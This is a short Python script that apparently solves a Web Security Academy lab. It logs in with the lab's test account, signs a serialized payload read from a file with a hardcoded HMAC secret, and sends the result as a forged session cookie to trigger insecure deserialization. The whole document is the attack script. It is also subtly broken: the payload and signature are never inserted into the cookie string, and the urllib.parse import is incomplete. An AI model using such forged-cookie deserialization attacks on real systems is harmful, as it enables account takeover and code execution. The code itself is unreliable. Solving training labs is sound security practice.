import requests
import hmac
import hashlib
import urllib

url = "https://acbe1f781fc2389ec086223600d90012.web-security-academy.net"

def slove(url):

	s = requests.session()

	with open('payload.txt') as f:
		payload = f.read().encode('utf-8')

	h = hmac.new(b"ytkvyds8nsivdv1bdkn8zxqg619rza0h", msg=bytes(payload), digestmod=hashlib.sha1)
	sign = h.hexdigest()

	data = {"username": "wiener", "password": "peter"}
	r1 = s.post(url+ "/login", data=data)
	
	c = '{"token": {payload} ,"sig_hmac_sha1":{sign}}'

	query = urllib.parse.quote_plus(c)
	exploit = s.get(url + "/", cookies={'session': query})

	print(exploit)

slove(url)